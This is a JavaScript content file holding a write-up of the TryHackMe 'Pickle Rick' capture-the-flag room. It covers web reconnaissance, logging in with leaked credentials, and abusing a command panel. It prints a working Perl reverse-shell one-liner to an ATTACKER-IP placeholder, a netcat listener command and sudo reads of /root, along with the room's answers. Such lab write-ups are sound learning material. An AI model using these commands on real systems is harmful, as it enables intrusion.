export default {
    id: 'pickle-rick-challenge',
    title: 'Pickle Rick',
    category: 'TryHackMe',
    difficulty: 'Easy',
    tags: ['Pen Testing, Web Application'],
    date: '2026-03-05T12:00:00',
    excerpt: 'Write up for Pickle Rick Challenge room on TryHackMe',
    content: `
This is the write up for the Pickle Rick Challenge room on TryHackMe.

⸻⸻⸻⸻⸻

This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

Deploy the virtual machine on this task and explore the web application: MACHINE\_IP

**Answer the questions below**⸻⸻⸻⸻⸻

What is the first ingredient that Rick needs?
**Answer:** mr. meeseek hair
**Reason:**
1. Run \`nmap -sS -sV -sC MACHINE\_IP\` to figure out if the host is online and which port is open.
2. After confirm that the host is online with port 80 and 22 is open, I can go and run \`gobuster dir -u MACHINE\_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php, txt, png, jpg\` to find all the directories and files.
3. In the result, I see that I have \`login.php\`, \`robots.txt\`, \`assets\` which \`assets\` is where the host store all the images and \`robots.txt\` and \`login.php\` seems like an interesting files that I can take a look at.
4. Looking into the \`robots.txt\`, I find a string \`Wubbalubbadubdub\`.
5. In the source code page of the website, I can find the username is \`R1ckRul3s\`. Great!
6. Now I can open a new tab and head to the \`login.php\` in which will ask us to enter in a username and a password. I have the username and maybe the random string I have from \`robots.txt\` can be our password. (Who knows, let try it out!).
7. After successfully login the page, I can see that I can enter in commands and when I visit other tabs, they all going to the same page \`denied,php\`.
8. I can try with \`ls\` in the command line and I see that it return a list of directories for us. However, when I try to \`cat Sup3rS3cretPickl3Ingred.txt\`, it returns an error \`Command disabled to make it hard for future PICKLEEEE RICCCKKKK.\`.
9. I can try \`sudo -ll\` to check our sudo status and I see that I am allow to run sudo as user \`www-data\`. This means that I don't have to do privilege escalation.
10. I can try to do reverse shell through commands (why not, they allowed it!). I look through <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentest Monkey Reverse Shell Cheat Sheet</a> and after testing bash, which doesn't work, I try pearl, which did.
12. Before running the reverse shell, I need to set up a listening port on my machine using netcat by running \`nc -lnvp LISTENING-PORT\`.
11. Then, I put \`perl -e 'use Socket;$i="ATTACKER-IP";$p=LISTENING-PORT;socket(S,PF\_INET,SOCK\_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr\_in($p,inet\_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'\` in the commands input form and submit it.
13. I successfully reverse shell and connect to the host machine. From here I can walked around the machine using \`ls\`, \`cd\`, \`cat\` to read and traverse the machine. Sometimes, I have to use \`sudo\` to perform certain actions.
14. By running \`cat Sup3rS3cretPickl3Ingred.txt\`, I get the first ingredient.

What is the second ingredient in Rick’s potion?
**Answer:** 1 jerry tear
**Reason:** After traversing the machine for a while, the second ingredient is in \`/home/rick/"second ingredient"\`.

What is the last and final ingredient?
**Answer:** fleeb juice
**Reason:** The third ingredient is in \`/root/3rd.txt\`. Since \`cd /root\` is denied, I have to use \`ls /root\` to find the file, then \`sudo cat /root/3rd.txt\` to read the file.
`
}